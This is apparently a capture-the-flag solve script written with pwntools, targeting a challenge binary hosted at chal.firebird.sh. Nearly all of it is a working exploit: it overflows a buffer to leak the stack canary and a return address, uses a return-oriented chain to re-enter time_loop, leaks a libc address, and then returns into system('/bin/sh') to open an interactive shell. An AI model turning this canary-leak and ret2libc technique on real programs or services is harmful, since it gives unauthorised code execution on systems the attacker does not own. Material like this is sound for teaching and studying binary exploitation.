from pwn import * 

binary = "./program_patched"
p = process(binary)
p = remote("chal.firebird.sh", 35037)
elf = ELF(binary)
s = 'b * time_loop+234'
#gdb.attach(p, s)

libc = ELF("libc.so.6")
context.binary = binary

# first day
p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
canary_bytes = output[24:32]
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00  
print(hex(canary))
# Second day 
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'C' * 16) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
return_addr = output[40:46].ljust(8, b'\x00')
return_addr = u64(return_addr)

elf.address = return_addr - 0x1373 
timeloop_address = elf.sym['time_loop']

# Last day, trying to loop back

payload = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address

    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(3),
    p64(timeloop_address)
)
p.recvuntil(b"hours remaining\n")
p.send(payload)

p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")

p.recvuntil(b"hours remaining\n")
p.send(b'C' * 7 + b'D' * 8) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
libc_return_addr = output[40:46].ljust(8, b'\x00')
libc_return_addr = u64(libc_return_addr) - 243



libc.address = libc_return_addr - libc.sym['__libc_start_main'] 
print(hex(libc.address))

payload2 = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address
    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])

)
p.recvuntil(b"hours remaining\n")
p.send(payload2)


p.interactive()
